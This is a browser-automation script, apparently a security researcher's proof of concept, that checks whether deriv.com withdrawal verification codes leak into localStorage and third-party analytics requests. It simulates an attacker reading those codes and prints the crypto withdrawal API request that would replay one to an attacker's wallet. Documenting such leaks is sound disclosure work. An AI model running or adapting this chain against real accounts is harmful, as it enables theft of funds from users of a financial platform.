const { chromium } = require('playwright');

(async () => {
  const browser = await chromium.launch();
  const context = await browser.newContext({
    viewport: { width: 1440, height: 900 },
    deviceScaleFactor: 2,
  });

  const page = await context.newPage();

  // Collect all network requests
  const thirdPartyLeaks = [];
  const localStorageWrites = [];

  page.on('request', req => {
    const url = req.url();
    const postData = req.postData() || '';
    // Check if any third-party request contains our test code
    if (url.includes('CHAINTEST_CODE_2026') || postData.includes('CHAINTEST_CODE_2026')) {
      const domain = new URL(url).hostname;
      if (!domain.includes('deriv.com')) {
        thirdPartyLeaks.push({
          service: domain,
          url: url.substring(0, 200),
          method: req.method(),
          hasCodeInUrl: url.includes('CHAINTEST_CODE_2026'),
          hasCodeInBody: postData.includes('CHAINTEST_CODE_2026'),
        });
      }
    }
  });

  console.log('=== STEP 1: Simulate victim clicking withdrawal verification email link ===');
  console.log('URL: https://app.deriv.com/?action=payment_withdraw&code=CHAINTEST_CODE_2026&loginid=CR1234567\n');

  await page.goto('https://app.deriv.com/?action=payment_withdraw&code=CHAINTEST_CODE_2026&loginid=CR1234567', {
    waitUntil: 'domcontentloaded',
    timeout: 30000,
  });

  // Wait for analytics scripts to fire
  await page.waitForTimeout(5000);

  // Screenshot the landing
  await page.screenshot({ path: '/tmp/claude-0/-home-user-aarshx05/45dd74dd-01a9-5d9a-a5ef-a7e38e76ddb7/scratchpad/chain-test/01-victim-clicks-email.png' });

  console.log('=== STEP 2: Check localStorage for verification code ===');
  const localStorageData = await page.evaluate(() => {
    const results = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      const value = localStorage.getItem(key);
      if (key.includes('verification') || key.includes('code') ||
          key.includes('ss_incoming') || key.includes('mt_event') ||
          value.includes('CHAINTEST_CODE_2026')) {
        results[key] = value.length > 500 ? value.substring(0, 500) + '...' : value;
      }
    }
    return results;
  });

  console.log('\nlocalStorage entries containing verification code:');
  for (const [key, value] of Object.entries(localStorageData)) {
    console.log(`  ${key}: ${value}`);
  }

  console.log('\n=== STEP 3: Check URL bar (Referer source) ===');
  const currentUrl = page.url();
  console.log(`Current URL: ${currentUrl}`);
  console.log(`Code in URL: ${currentUrl.includes('CHAINTEST_CODE_2026')}`);

  console.log('\n=== STEP 4: Third-party network leaks detected ===');
  console.log(`Total third-party requests containing code: ${thirdPartyLeaks.length}`);
  for (const leak of thirdPartyLeaks) {
    console.log(`  [${leak.method}] ${leak.service}`);
    console.log(`    URL contains code: ${leak.hasCodeInUrl}`);
    console.log(`    Body contains code: ${leak.hasCodeInBody}`);
    console.log(`    Endpoint: ${leak.url}`);
  }

  // Screenshot showing the page state
  await page.screenshot({ path: '/tmp/claude-0/-home-user-aarshx05/45dd74dd-01a9-5d9a-a5ef-a7e38e76ddb7/scratchpad/chain-test/02-page-loaded-analytics-fired.png' });

  console.log('\n=== STEP 5: Simulate attacker XSS / extension reading localStorage ===');
  const stolenCode = await page.evaluate(() => {
    // This is what a malicious extension or XSS payload would do
    const code = localStorage.getItem('verification_code.payment_withdraw');

    // Also check the analytics SDK storage
    const ssParams = localStorage.getItem('ss_incoming_params');

    // Try all possible keys
    const allCodeLocations = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      const val = localStorage.getItem(key);
      if (val && val.includes('CHAINTEST_CODE_2026')) {
        allCodeLocations[key] = val.length > 300 ? val.substring(0, 300) + '...' : val;
      }
    }

    return {
      direct_key: code,
      ss_incoming_params: ssParams ? JSON.parse(ssParams) : null,
      all_locations: allCodeLocations,
    };
  });

  console.log('\nAttacker reads from localStorage:');
  console.log(`  Direct key (verification_code.payment_withdraw): ${stolenCode.direct_key}`);
  console.log(`  AppsFlyer/Singular SDK (ss_incoming_params): ${JSON.stringify(stolenCode.ss_incoming_params, null, 2)}`);
  console.log(`  All localStorage keys containing code: ${JSON.stringify(Object.keys(stolenCode.all_locations))}`);

  console.log('\n=== STEP 6: Check Referrer-Policy (does it protect against URL leaks?) ===');
  const headers = await page.evaluate(() => {
    return {
      referrerPolicy: document.querySelector('meta[name="referrer"]')?.content || 'not set in meta',
    };
  });
  // Also get it from response headers
  console.log(`  Meta referrer: ${headers.referrerPolicy}`);
  console.log('  (Header Referrer-Policy was confirmed as strict-origin-when-cross-origin in earlier tests)');

  console.log('\n=== STEP 7: Simulate wallet withdrawal path ===');
  await page.goto('https://app.deriv.com/wallets/cashier/withdrawal?verification=CHAINTEST_CODE_2026&loginid=CRW12345', {
    waitUntil: 'domcontentloaded',
    timeout: 30000,
  });
  await page.waitForTimeout(3000);

  const walletLeaks = await page.evaluate(() => {
    const results = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      const val = localStorage.getItem(key);
      if (val && val.includes('CHAINTEST_CODE_2026')) {
        results[key] = val.length > 300 ? val.substring(0, 300) + '...' : val;
      }
    }
    return results;
  });
  console.log('\nWallet path localStorage leaks:');
  for (const [key, value] of Object.entries(walletLeaks)) {
    console.log(`  ${key}: ${value}`);
  }

  await page.screenshot({ path: '/tmp/claude-0/-home-user-aarshx05/45dd74dd-01a9-5d9a-a5ef-a7e38e76ddb7/scratchpad/chain-test/03-wallet-path.png' });

  console.log('\n=== STEP 8: Build the API call an attacker would make ===');
  console.log('With the stolen verification code, an attacker constructs:');
  console.log(JSON.stringify({
    cashier: 'withdraw',
    provider: 'crypto',
    type: 'api',
    address: 'ATTACKER_WALLET_ADDRESS',
    amount: 100,
    verification_code: 'CHAINTEST_CODE_2026',
    dry_run: 0,
  }, null, 2));
  console.log('Sent via WebSocket to: wss://ws.derivws.com/websockets/v3?app_id=16929');

  console.log('\n=== SUMMARY ===');
  const totalLeakPaths = thirdPartyLeaks.length + Object.keys(stolenCode.all_locations).length;
  console.log(`Verification code found in ${Object.keys(stolenCode.all_locations).length} localStorage keys`);
  console.log(`Verification code sent to ${thirdPartyLeaks.length} third-party endpoints`);
  console.log(`Total independent leak paths: ${totalLeakPaths}`);
  console.log(`Code usable for withdrawal API: YES (passed directly as verification_code parameter)`);

  await browser.close();
})();
